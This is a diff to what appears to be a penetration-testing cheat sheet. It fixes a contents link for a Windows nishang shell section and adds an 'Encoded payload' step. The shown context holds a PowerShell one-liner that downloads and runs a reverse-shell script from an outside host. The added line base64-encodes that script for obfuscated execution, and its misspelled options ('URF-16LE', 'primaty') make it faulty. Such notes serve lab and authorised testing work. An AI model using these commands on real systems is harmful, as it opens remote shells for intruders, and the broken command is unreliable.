@@ -11,7 +11,7 @@
 - [Redis](#Reids)
 - [Search files](#Search files)
 - [Python SERVER](#Python SERVER)
-- [Windows nishang shell](#DNS)
+- [Windows nishang shell](#Windows nishang shell)
 - [Shells](#Shells)
 - [Metasploit](#Metasploit)
 - [Privilige Escalation](#Privilige Escalation)
@@ -161,6 +161,10 @@ Linux Site:
 Windows Site:
 
 - C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.webClient).downloadString('http://10.10.10.10:8000/Invoke-PowerShellTcp.ps1')
+
+Encoded payload:
+
+- cat Invoke-PowerShellTcp.ps1 | iconv -t URF-16LE | base64 -w0 | xclip -selection primaty
 
 ## Shells
 
